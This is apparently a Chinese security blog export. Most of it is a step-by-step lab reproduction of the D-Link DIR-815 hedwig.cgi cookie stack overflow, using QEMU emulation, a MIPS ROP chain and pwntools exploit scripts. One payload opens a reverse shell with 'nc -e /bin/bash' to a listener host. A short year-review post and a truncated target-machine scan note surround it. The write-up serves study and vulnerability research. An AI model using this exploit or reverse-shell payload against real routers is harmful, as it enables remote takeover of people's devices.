前期开源的《物联网设备固件分析指南》受到众多关注，受邀和看雪学苑合作，依托于团队成员共同设计和录制《系统0day安全-IOT设备漏洞挖掘》。自6月份，从基础出发，涵盖固件获取、解包、仿真，再到漏洞分析与利用，打造一条完整的学习路径。课程不仅讲解理论知识，更注重实战操作，让你在动手中掌握IoT漏洞挖掘的核心技能。 团队知识库建设20242024年，团队也没有停止内部文库的建设。 团队内部建立了Web安全、二进制安全、漏洞PoC库等多个知识库，囊括从Web安全的基础原理，到SRC实战的记录，以及漏洞的详细分析复现笔记，还有团队内部的资源和资料的分享，形成了良好的体系化学习框架，积累了大量高质量博客、笔记。 我们的元旦大会在最后的元旦中，我们举办了年度大会，带领大家总结了我们一年的成果，并且通过一些小游戏，给大家送了一些有意思的奖品，有纸质的知识，有团队定制的U盘，定制的925银戒指等等，想看回放戳下方。 最后新年回放戳下方哦https://www.bilibili.com/video/BV1Q1wAedErw/?spm_id_from=333.1387.homepage.video_card.click最后祝各位师傅新年多0day，年薪均过百，安全事业越来越好！！！","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"author":"【白】"},{"title":"D-LINK DIR-815多次溢出漏洞","slug":"D-LINK-DIR-815-overflow-vuln","date":"2024-12-15T16:00:00.000Z","updated":"2025-07-15T14:37:07.594Z","comments":true,"path":"2024/12/16/D-LINK-DIR-815-overflow-vuln/","permalink":"http://example.com/2024/12/16/D-LINK-DIR-815-overflow-vuln/","excerpt":"","text":"发布时间: title: D-LINK DIR-815多次溢出漏洞 author: 1ens tags: - 漏洞复现 categories: - iot date:2022-08-25 准备 参考：[原创]家用路由器漏洞挖掘实例分析[图解D-LINK DIR-815多次溢出漏洞]-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com 该漏洞的描述位于这里，可知漏洞出现在hedwig.cgi文件中，漏洞产生的原因是Cookie的值超长造成缓冲区溢出。首先了解一下cgi文件。 cgi(Common Gateway Interface)，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。 固件下载地址 http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP binwalk解压固件 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587184130.png) 查看bin&#x2F;busybox 得知是MIPS32，小端： ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587184241.png) 寻找线索 find . -name &#39;*cgi&#39;查找文件 并ls -l ./htdocs/web/hedwig.cgi发现hedwig.cgi是指向.&#x2F;htdocs&#x2F;cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。 静态分析 IDA静态调试cgibin文件，hedwigcgi_main函数处理整个过程，由于是HTTP_COOK这个字段引起的漏洞溢出点，可以在IDA（SHIFT+F12）搜索字符串，然后通过X，交叉引用来跟踪到hedwigcgi_main函数条用的位置。 跟踪到主函数的位置hedwigcgi_main，对函数功能进行大致分析，可以定位到其中的sprintf函数引起了栈溢出。调用sess_get_uid，得到HTTP_COOKIE的值。同样创建两个指针数组a1,a2，以等号为界将前半部分存入a1偏移为5处，后半部分存入a2偏移为5处，a1[5]为uid则将a2[5]存入参数指针数组的偏移为5处。函数sobj_get_string获得该数组中指向cookie的指针。 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587184394.png) IDA动态调试-确定偏移位置 程序通过 getenv 的方式获取 HTTP 数据包中的数据，流程应该为： ​​ 主Web程序监听端口-&gt;传送HTTP数据包-&gt;​ HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;​ cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据​ #POST具体数据可以通过类似输入流传入 ：echo “uid&#x3D;aaa”| &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi 测试脚本test.sh ​​ #!&#x2F;bin&#x2F;bash​ #注意：里面&#x3D;和变量之间一定不要有空格，坑，否则读入空数据。​ test&#x3D;$(python -c “print (‘uid&#x3D;’+open(‘content’,’r’).read(2000))”) #方式一，以文件形式读入内容，提前填充好构造的数据到content文件​ #test&#x3D;$(python -c “print ‘uid&#x3D;’ + ‘A’*0x600” )#方式二，直接后面接数据内容​ #test&#x3D;$(python -c “print ‘uid&#x3D;’+open(‘exploit’,’r’).read()”)​ #test &#x3D;$(python -c “print ‘uid&#x3D;’ + ‘A’*1043 + ‘B’*4”)#可选构造数据​ ​ LEN&#x3D;$(echo -n “$test” | wc -c) ​ PORT&#x3D;”1234”​ cp $(which qemu-mipsel-static) .&#x2F;qemu​ sudo chroot . .&#x2F;qemu -E CONTENT_LENGTH&#x3D;$LEN -E CONTENT_TYPE&#x3D;”application&#x2F;x-www-form-urlencoded” -E REQUEST_METHOD&#x3D;”POST” -E HTTP_COOKIE&#x3D;$test -E REQUEST_URL&#x3D;”&#x2F;hedwig.cgi” -E REMOTE_ADDR&#x3D;”127.0.0.1” -g $PORT &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi 2&gt;&#x2F;dev&#x2F;null ​ #-E参数：加入环境变量 ；2&gt;&#x2F;dev&#x2F;null ：不输出提示错误​ rm -f .&#x2F;qemu 利用patternLocOffset.py生成content文件，包含特定格式的2000个字符串。类似于cyclic ​​ python patternLocOffset.py -c -l 2000 -f content 在0x0409A38处断下 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587184732.png)![](&#x2F;images&#x2F;D-LINKDIR-815多次溢出漏洞&#x2F;1752587185298.png) python patternLocOffset.py -s 0x38694237 -l 2000计算偏移： ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185374.png) 跟完sess_get_uid()函数可发现后面还有一个sprintf()，这里也会造成栈溢出，哪到底哪个才是真正的利用点呢 从整个函数可以看出，fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)的成功与否会导致程序走向这两个地方，即成功后是第二个sprintf()为溢出利用点，而失败时是第一个sprintf()为溢出利用点 如果 fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;) 打开成功则会执行到第二个sprintf，因为没有实机没法判断实际固件中是否有这个目录 因此我们手动创建该目录及文件 ​​ mkdir var&#x2F;tmp​ touch var&#x2F;tmp&#x2F;temp.xml 这里假设第二个sprintf()为漏洞点（其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造 rop链方法都是一样的），所以偏移得重新计算 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185429.png) 但是haystack为0的话无法走到第二个sprintf ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185517.png) 交叉引用找到这 动调可知在sub_402B40函数，这里影响着haystack的赋值 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185583.png) 这部分前面的代码，可知随便传点参数即可 参考D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站 #!/bin/bash # test2.sh INPUT=&quot;x=x&quot; COOKIE=$(python -c &quot;print(&#39;uid=&#39; + open(&#39;context&#39;,&#39;r&#39;).read())&quot;) PORT=&quot;1234&quot; LEN=$(echo -n &quot;$INPUT&quot; | wc -c) cp $(which qemu-mipsel-static) ./qemu echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgi rm -f ./qemu ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185654.png)![](&#x2F;images&#x2F;D-LINKDIR-815多次溢出漏洞&#x2F;1752587185715.png) 最终的偏移为1009. ROP 链的构造 gdb-multiarch+QEMU动态调试分析验证1，通过gdb指定脚本调试（避免重复输入，重复造轮子浪费时间） ​​ set architecture mips​ set endian little​ target remote :1234​ b *0x409a54​ c​ vmmap 执行 #一定要加载文件htdocs&#x2F;cgibin不然vmmap得不到结果 ​​ gdb-multiarch htdocs&#x2F;cgibin -x dbgscript -x是指定要执行的命令文件 but…还是每找到完整的vmmap ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185845.png) 但实际上，我们查看 lib 目录下的 libc.so.0 即可知 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185917.png) 找到systeam的地址 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587185999.png) 另外一种方法 ​​ from pwn import *​ context.arch &#x3D; “mips”​ context.endian &#x3D; “little”​​ libc &#x3D; ELF(“.&#x2F;lib&#x2F;libuClibc-0.9.30.1.so”)​ libc.address &#x3D; 0x77fe2000 # base address rop链的基地址，确定方法在后面​ system_addr &#x3D; libc.symbols[‘system’]​ log.success(“system address: 0x%x” % system_addr) 得到 system address: 0x7f78b200 然后便是找一个能将 system() 首个参数写入 $a0 的 gadget，这里在 libuClibc-0.9.30.1.so 中使用mipsrop 插件，利用 mipsrop.stackfinder() 命令找将栈上数据放入寄存器的 gadget： ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186117.png) 打开 mips rop gadgets 然后命令行输入mipsrop.stackfinders() ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186234.png) 选择0x159cc的指令。该指令序列首先将SP+0x10（动调）地址存入寄存器S5中，而在偏移0x159EO处将$S5作为参数存入Sa0，也就是说，这里需要将第一步得到的system地址填充到$So中，然后在$SP+0x10处填充需要执行的命令，即可实现对system(“”command”)函数的调用。 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186331.png) 因为 system地址的最低位为0x00，而在 hedwig_main获取Cookie的过程中，也没有对这部分数据进行解码，所以，试图通过访问hedwig.cgi时对Cookie进行编码来避开0x00是不可能的，这就使 sprintf函数可能被截断，造成缓冲区溢出失败。为了避开0x00，写入时- 1 ，后面再找一个 gadget 加一即可 hedwigcgi_main() 结尾部分： ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186447.png) 修改 ​​ $s0​ $s1​ $s2​ $s3​ $s4​ $s5​ $s6​ $s7​ $fp​ $ra &lt;&#x3D;&#x3D; 返回地址 ROP的思路 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186551.png) ​​ from pwn import *​ from MIPSPayload import MIPSPayload​ import string, random, sys​ class MIPSPayload:​ BADBYTES &#x3D; b”\\x00”​ LITTLE &#x3D; “little”​ BIG &#x3D; “big”​ FILLER &#x3D; b”A”​ BYTES &#x3D; 4​ def init(self, elfbase:int, endian:str &#x3D; LITTLE, badbytes: bytes &#x3D; BADBYTES):​ self.elfbase &#x3D; elfbase​ self.badbytes &#x3D; badbytes​ self.endian &#x3D; endian​ self.payload &#x3D; bytes()​ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 def rand_text(self, size): table = (string.ascii_letters + string.digits).encode() return bytes(random.choices(table, k=size)) def Add(self, data): if type(data) is bytes: self.payload += data else: raise TypeError(&quot;%s is no support type&quot; % type(data)) def Address(self, offset, base=None): if base is None: base = self.elfbase return self.ToBytes(base + offset) def AddAddress(self, offset, base=None): self.Add(self.Address(offset, base)) def ToBytes(self, value, size=BYTES): data = [(value &gt;&gt; (8 * i)) &amp; 0xff for i in range(size)] if self.endian != self.LITTLE: data = data[::-1] return bytes(data) def AddNOPs(self, size): self.Add(self.rand_text(size)) def AddBuffer(self, size, byte=FILLER): self.Add(byte * size) def Build(self): count = 0 for c in self.payload: if self.badbytes.find(c) != -1: raise ValueError(&quot;Bad byte found in payload at offset %d: 0x%.2X&quot; % (count, c)) count += 1 return self.payload def Print(self, bpl = BYTES): i = 0 for c in self.payload: if i == 4: print() i = 0 sys.stdout.write(&quot;\\\\x%.2X&quot; % c) sys.stdout.flush() if bpl &gt; 0: i += 1 print(&quot;\\n&quot;) context.arch = &quot;mips&quot; context.endian = &quot;little&quot; context.log_level = &quot;debug&quot; payload = MIPSPayload(0x7f738000) libc = ELF(&quot;./lib/libuClibc-0.9.30.1.so&quot;) libc.address = 0x77fe2000 system_addr = libc.symbols[&#x27;system&#x27;] log.success(&quot;system address: 0x%x&quot; % system_addr) calcsystem = 0x158c8 # $s0 add 1, jalr $s5 callsystem = 0x159cc # cmd -&gt; $a0, jalr $s0 (system_addr) payload.AddBuffer(0x3CD) # 973 payload.AddAddress(system_addr - 1) # $s0 977 payload.AddBuffer(4) # $s1 981 payload.AddBuffer(4) # $s2 985 payload.AddBuffer(4) # $s3 989 payload.AddBuffer(4) # $s4 993 payload.AddAddress(callsystem) # $s5 997 payload.AddBuffer(4) # $s6 1001 payload.AddBuffer(4) # $s7 1005 payload.AddBuffer(4) # $fp 1009 payload.AddAddress(calcsystem) # $ra payload.AddBuffer(0x10) # .text:000159CC addiu $s5, $sp, 0x170+var_160 payload.Add(b&#x27;//bin/sh&#x27;) f = open(&quot;exploit&quot;, &#x27;wb+&#x27;) f.write(payload.Build()) f.close() qemu系统模式 这里主要是为了在qemu虚拟机中重现http服务。 /sbin/httpd应该是用于监听web端口的http服务，同时查看/htdocs/web文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。 find ./ -name &#39;*http*&#39;找到web配置文件httpcfg.php ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186708.png) 查看内容后分析出httpcfg.php文件的作用是生成供所需服务的配置文件的内容，所以我们参照里面内容，自己创建一个conf作为生成的配置文件，填充我们所需的内容。（留个坑，暂时没搞懂） ​​ Umask 026​ PIDFile &#x2F;var&#x2F;run&#x2F;httpd.pid​ LogGMT On #开启log​ ErrorLog &#x2F;log #log文件​​ Tuning​ {​ NumConnections 15​ BufSize 12288​ InputBufSize 4096​ ScriptBufSize 4096​ NumHeaders 100​ Timeout 60​ ScriptTimeout 60​ }​​ Control​ {​ Types​ {​ text&#x2F;html { html htm }​ text&#x2F;xml { xml }​ text&#x2F;plain { txt }​ image&#x2F;gif { gif }​ image&#x2F;jpeg { jpg }​ text&#x2F;css { css }​ application&#x2F;octet-stream { * }​ }​ Specials​ {​ Dump { &#x2F;dump }​ CGI { cgi }​ Imagemap { map }​ Redirect { url }​ }​ External​ {​ &#x2F;usr&#x2F;sbin&#x2F;phpcgi { php }​ }​ } 1234567891011121314151617181920212223242526272829303132333435 Server ​ &#123; ​ ServerName &quot;Linux, HTTP/1.1, &quot; ​ ServerId &quot;1234&quot; ​ Family inet ​ Interface eth0 #对应qemu仿真路由器系统的网卡 ​ Address 192.168.40.138 #qemu仿真路由器系统的IP ​ Port &quot;1234&quot; #对应未被使用的端口 ​ Virtual ​ &#123; ​ AnyHost ​ Control ​ &#123; ​ Alias / ​ Location /htdocs/web ​ IndexNames &#123; index.php &#125; ​ External ​ &#123; ​ /usr/sbin/phpcgi &#123; router_info.xml &#125; ​ /usr/sbin/phpcgi &#123; post_login.xml &#125; ​ &#125; ​ &#125; ​ Control ​ &#123; ​ Alias /HNAP1 ​ Location /htdocs/HNAP1 ​ External ​ &#123; ​ /usr/sbin/hnap &#123; hnap &#125; ​ &#125; ​ IndexNames &#123; index.hnap &#125; ​ &#125; ​ &#125; ​ &#125; 使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：Index of&#x2F;~aurel32&#x2F;qemu 因为是小端，这里直接选择mipsel，然后下载其中两个文件： ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186762.png) debian_squeeze_mipsel_standard.qcow2 是文件系统，vmlinux-3.2.0-4-4kc-malta是内核镜像 启动脚本start.sh ​​ sudo qemu-system-mipsel \\​ -M malta \\​ -kernel vmlinux-3.2.0-4-4kc-malta \\​ -hda debian_squeeze_mipsel_standard.qcow2 \\​ -append “root&#x3D;&#x2F;dev&#x2F;sda1 console&#x3D;tty0” \\​ -net nic \\​ -net tap \\​ -nographic \\ ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186842.png) 输入用户名&#x2F;密码 root&#x2F;root或user&#x2F;user即可登录qemu模拟的系统 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587186926.png) 接下来在宿主机创建一个网卡，使qemu内能和宿主机通信。 安装依赖库： ​​ sudo apt-get install bridge-utils uml-utilities 在宿主机编写如下文件保存为net.sh并运行： ​​ sudo sysctl -w net.ipv4.ip_forward&#x3D;1​ sudo iptables -F​ sudo iptables -X​ sudo iptables -t nat -F​ sudo iptables -t nat -X​ sudo iptables -t mangle -F​ sudo iptables -t mangle -X​ sudo iptables -P INPUT ACCEPT​ sudo iptables -P FORWARD ACCEPT​ sudo iptables -P OUTPUT ACCEPT​ sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE​ sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT​ sudo iptables -I FORWARD 1 -o tap0 -m state –state RELATED,ESTABLISHED -j ACCEPT​ sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187141.png) 然后配置qemu虚拟系统的路由，在qemu虚拟系统中编写net.sh并运行： ​​ #！&#x2F;bin&#x2F;sh​ ifconfig eth0 192.168.100.2 netmask 255.255.255.0​ route add default gw 192.168.100.254 eth0的网卡是192.168.100.2并且可以和宿主机ping通表示成功 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187207.png) 随后使用scp命令将binwalk解压出来的squashfs-root 文件夹上传到qemu系统中的**&#x2F;root** 路径下： ​​ scp -r squashfs-root&#x2F; &#x72;&#x6f;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x30;&#x30;&#46;&#x32;:&#x2F;root 然后在qemu虚拟系统中将squashfs-root文件夹下的库文件替换掉原有的，此操作会改变文件系统，如果不小心退出了虚拟系统，再次启动qemu时会失败，原因是因为改变了文件系统的内容。此时需要使用新的文件系统，因此在此操作之前可以先备份一份。编写auto.sh并执行： ​​ cp sbin&#x2F;httpd &#x2F;​ cp -rf htdocs&#x2F; &#x2F;​ rm -rf &#x2F;etc&#x2F;services​ cp -rf etc&#x2F; &#x2F;​ cp lib&#x2F;ld-uClibc-0.9.30.1.so &#x2F;lib&#x2F;​ cp lib&#x2F;libcrypt-0.9.30.1.so &#x2F;lib&#x2F;​ cp lib&#x2F;libc.so.0 &#x2F;lib&#x2F;​ cp lib&#x2F;libgcc_s.so.1 &#x2F;lib&#x2F;​ cp lib&#x2F;ld-uClibc.so.0 &#x2F;lib&#x2F;​ cp lib&#x2F;libcrypt.so.0 &#x2F;lib&#x2F;​ cp lib&#x2F;libgcc_s.so &#x2F;lib&#x2F;​ cp lib&#x2F;libuClibc-0.9.30.1.so &#x2F;lib&#x2F;​ cd &#x2F;​ ln -s &#x2F;htdocs&#x2F;cgibin &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi​ ln -s &#x2F;htdocs&#x2F;cgibin &#x2F;usr&#x2F;sbin&#x2F;phpcgi 接下来在qemu虚拟系统的根目录（ &#x2F; ）下，创建一个名为conf的文件，此文件是httpd服务的配置文件。内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374​ Umask 026 ​ PIDFile /var/run/httpd.pid ​ LogGMT On #开启log ​ ErrorLog /log #log文件 ​ Tuning ​ &#123; ​ NumConnections 15 ​ BufSize 12288 ​ InputBufSize 4096 ​ ScriptBufSize 4096 ​ NumHeaders 100 ​ Timeout 60 ​ ScriptTimeout 60 ​ &#125; ​ Control ​ &#123; ​ Types ​ &#123; ​ text/html &#123; html htm &#125; ​ text/xml &#123; xml &#125; ​ text/plain &#123; txt &#125; ​ image/gif &#123; gif &#125; ​ image/jpeg &#123; jpg &#125; ​ text/css &#123; css &#125; ​ application/octet-stream &#123; * &#125; ​ &#125; ​ Specials ​ &#123; ​ Dump &#123; /dump &#125; ​ CGI &#123; cgi &#125; ​ Imagemap &#123; map &#125; ​ Redirect &#123; url &#125; ​ &#125; ​ External ​ &#123; ​ /usr/sbin/phpcgi &#123; php &#125; ​ &#125; ​ &#125; ​ Server ​ &#123; ​ ServerName &quot;Linux, HTTP/1.1, &quot; ​ ServerId &quot;1234&quot; ​ Family inet ​ Interface eth0 #网卡 ​ Address 192.168.100.2 #qemu的ip地址 ​ Port &quot;4321&quot; #对应web访问端口 ​ Virtual ​ &#123; ​ AnyHost ​ Control ​ &#123; ​ Alias / ​ Location /htdocs/web ​ IndexNames &#123; index.php &#125; ​ External ​ &#123; ​ /usr/sbin/phpcgi &#123; router_info.xml &#125; ​ /usr/sbin/phpcgi &#123; post_login.xml &#125; ​ &#125; ​ &#125; ​ Control ​ &#123; ​ Alias /HNAP1 ​ Location /htdocs/HNAP1 ​ External ​ &#123; ​ /usr/sbin/hnap &#123; hnap &#125; ​ &#125; ​ IndexNames &#123; index.hnap &#125; ​ &#125; ​ &#125; ​ &#125; 最后启动httpd服务： ​ .&#x2F;httpd -f conf ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187448.png) 这里访问失败是因为hedwig.cgi服务没有收到请求，需要提前配置qemu虚拟环境中的REQUEST_METHOD等方法，因为httpd是读取的环境变量，这里就直接通过环境变量进行设置： ​​ export CONTENT_LENGTH&#x3D;”100”​ export CONTENT_TYPE&#x3D;”application&#x2F;x-www-form-urlencoded”​ export REQUEST_METHOD&#x3D;”POST”​ export REQUEST_URI&#x3D;”&#x2F;hedwig.cgi”​ export HTTP_COOKIE&#x3D;”uid&#x3D;1234” 这里在qemu虚拟系统中运行hedwig.cgi，再次访问http://192.168.100.2:4321/hedwig.cgi就可以正常收到内容了 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187542.png) 接下来就是使用gdbserver对hedwig.cgi进行调试了。 gdbserver调试 动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化 ​​ echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space 注：正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制 这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的 gdbserver auto.shell ​​ #!&#x2F;bin&#x2F;bash​ export CONTENT_LENGTH&#x3D;”100”​ export CONTENT_TYPE&#x3D;”application&#x2F;x-www-form-urlencoded”​ export HTTP_COOKIE&#x3D;”uid&#x3D;cat content“ #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建​ export REQUEST_METHOD&#x3D;”POST”​ export REQUEST_URI&#x3D;”&#x2F;hedwig.cgi”​ echo “uid&#x3D;1234”|.&#x2F;gdbserver 192.168.100.254:8888 &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi #IP为宿主机IP 宿主机连接 gdbserver ​​ gdb-multiarch htdocs&#x2F;cgibin​ set architecture mips​ target remote 192.168.100.2:8888 #对应qemu地址和端口 这里我们终于可以看到vmmap ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187655.png) 接下来是确定libc的基地址，需要先把环境变量配置好，不然&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。 利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来） ​​ &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi &amp; cat &#x2F;proc&#x2F;pid&#x2F;maps a &amp;b先执行a，在执行b，无论a成功与否都会执行b。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。 ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187709.png) ​​ export CONTENT_LENGTH&#x3D;”100”​ root@debian-mipsel:# export CONTENT_TYPE&#x3D;”application&#x2F;x-www-form-urlencoded”​ root@debian-mipsel:# export HTTP_COOKIE&#x3D;”uid&#x3D;1234”​ root@debian-mipsel:# export REQUEST_METHOD&#x3D;”POST”​ root@debian-mipsel:# export REQUEST_URI&#x3D;”&#x2F;hedwig.cgi”​ root@debian-mipsel:# &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi &amp; cat &#x2F;proc&#x2F;pid&#x2F;maps​ [2] 1224​ cat: &#x2F;proc&#x2F;pid&#x2F;maps: No such file or directory​ root@debian-mipsel:# &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi &amp; cat &#x2F;proc&#x2F;1226&#x2F;maps​ [3] 1226​ 00400000-0041c000 r-xp 00000000 08:01 32694 &#x2F;htdocs&#x2F;cgibin​ 0042c000-0042d000 rw-p 0001c000 08:01 32694 &#x2F;htdocs&#x2F;cgibin​ 0042d000-0042f000 rwxp 00000000 00:00 0 [heap]​ 77f34000-77f92000 r-xp 00000000 08:01 547906 &#x2F;lib&#x2F;libc.so.0​ 77f92000-77fa1000 —p 00000000 00:00 0 ​ 77fa1000-77fa2000 r–p 0005d000 08:01 547906 &#x2F;lib&#x2F;libc.so.0​ 77fa2000-77fa3000 rw-p 0005e000 08:01 547906 &#x2F;lib&#x2F;libc.so.0​ 77fa3000-77fa8000 rw-p 00000000 00:00 0 ​ 77fa8000-77fd1000 r-xp 00000000 08:01 546761 &#x2F;lib&#x2F;libgcc_s.so.1​ 77fd1000-77fe1000 —p 00000000 00:00 0 ​ 77fe1000-77fe2000 rw-p 00029000 08:01 546761 &#x2F;lib&#x2F;libgcc_s.so.1​ 77fe2000-77fe7000 r-xp 00000000 08:01 547907 &#x2F;lib&#x2F;ld-uClibc.so.0​ 77ff5000-77ff6000 rw-p 00000000 00:00 0 ​ 77ff6000-77ff7000 r–p 00004000 08:01 547907 &#x2F;lib&#x2F;ld-uClibc.so.0​ 77ff7000-77ff8000 rw-p 00005000 08:01 547907 &#x2F;lib&#x2F;ld-uClibc.so.0​ 7ffd6000-7fff7000 rwxp 00000000 00:00 0 [stack]​ 7fff7000-7fff8000 r-xp 00000000 00:00 0 [vdso] 编写exp（注意是py2 ​​ #!&#x2F;usr&#x2F;bin&#x2F;python2​ from pwn import *​ context.endian &#x3D; “little”​ context.arch &#x3D; “mips”​ base_addr &#x3D; 0x77f34000​ system_addr_1 &#x3D; 0x53200-1​ gadget1 &#x3D; 0x45988​ gadget2 &#x3D; 0x159cc​​ cmd &#x3D; ‘nc -e &#x2F;bin&#x2F;bash 192.168.100.254 9999’​ padding &#x3D; ‘A’ * 973 #1009-4*9​ padding +&#x3D; p32(base_addr + system_addr_1) # s0​ padding +&#x3D; p32(base_addr + gadget2) # s1​ padding +&#x3D; ‘A’ * 4 # s2​ padding +&#x3D; ‘A’ * 4 # s3​ padding +&#x3D; ‘A’ * 4 # s4​ padding +&#x3D; ‘A’ * 4 # s5​ padding +&#x3D; ‘A’ * 4 # s6​ padding +&#x3D; ‘A’ * 4 # s7​ padding +&#x3D; ‘A’ * 4 # fp​ padding +&#x3D; p32(base_addr + gadget1) # ra​ padding +&#x3D; ‘B’ * 0x10​ padding +&#x3D; cmd​​ f &#x3D; open(“context”,’wb’)​ f.write(padding)​ f.close() 生成的context通过scp拷贝到mips虚拟机目录中并且在目录下创造debug.sh ​​ export CONTENT_LENGTH&#x3D;”100”​ export CONTENT_TYPE&#x3D;”application&#x2F;x-www-form-urlencoded”​ export HTTP_COOKIE&#x3D;”uid&#x3D;cat context“​ export REQUEST_METHOD&#x3D;”POST”​ export REQUEST_URI&#x3D;”&#x2F;hedwig.cgi”​ echo “uid&#x3D;1234”|&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi 在宿主机运行 ​​ nc -vlp 9999 然后再mips虚拟机执行debug.sh ![](&#x2F;images&#x2F;D-LINK DIR-815多次溢出漏洞&#x2F;1752587187801.png) getshell ! 总结 断断停停终于算是真正完整复现了第一个漏洞，dlinkDIR-815，依照0day路由器漏洞挖掘还有师傅们的博客，对mips架构和qemu有了进一步的了解","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"curve"},{"title":"sar--打靶笔记","slug":"sar-attack-record","date":"2024-12-09T16:00:00.000Z","updated":"2025-07-15T14:31:57.855Z","comments":true,"path":"2024/12/10/sar-attack-record/","permalink":"http://example.com/2024/12/10/sar-attack-record/","excerpt":"","text":"PART.01 靶机设置 将网络配置调整为NAT模式即可 ‍ PART.02 Nmap扫描 · 主机发现 · ​​ sudo nmap -sn 192.168.9.150&#x2F;24 新增IP为靶机IP：192.168.9.160 ‍ · TCP开放端口扫描 · ​​ sudo nmap -sT 